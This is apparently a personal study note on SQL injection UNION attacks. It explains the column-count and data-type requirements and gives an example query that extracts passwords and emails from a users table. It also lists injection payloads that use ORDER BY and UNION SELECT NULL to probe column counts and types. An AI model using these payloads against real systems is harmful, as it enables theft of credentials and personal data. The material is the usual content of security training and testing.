---
Title: UNION Attacks
tags:
  - SQLi
---
# UNION Attacks
A union attack occurs, when we try sqli on a vulnerable statement that has a specific amount of columns to return.

In order for us to do a UNION attack, we must fulfill 2 requirements, we need to have the same amount of columns, and each columns should have the same or compatible data type, when exfiltrating it.

Example:
```sql
SELECT name, age, address FROM users WHERE name = 'kohi';
```

As you can see, it selects 3 columns to return with the condition of "where name is equals to kohi". Let's assume that name and address are varchars, and age being an integer. We can create a query as such.

Example:
```sql
SELECT name, age, address FROM users WHERE name = 'kohi' UNION SELECT password, contact_number, email FROM users;
```

As you can see, our arbitrary payload selects 3 sensitive columns, this query itself will return the values of the union select we did, instead of the first one.

___
# Identifying the attack
Of course, we won't be able to see the sql statements that is being called in the application, that is why, when we find a vulnerable parameter or endpoint, we need to first identify if we can fulfill the requirements of a union attack.

## Determining the number of columns
> Using ORDER
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

> Using UNION 
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

## Determining the column data types
> Using UNION SELECT
```sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

The way we can use this is by looking at the errors, it would usually contain the datatype in the error.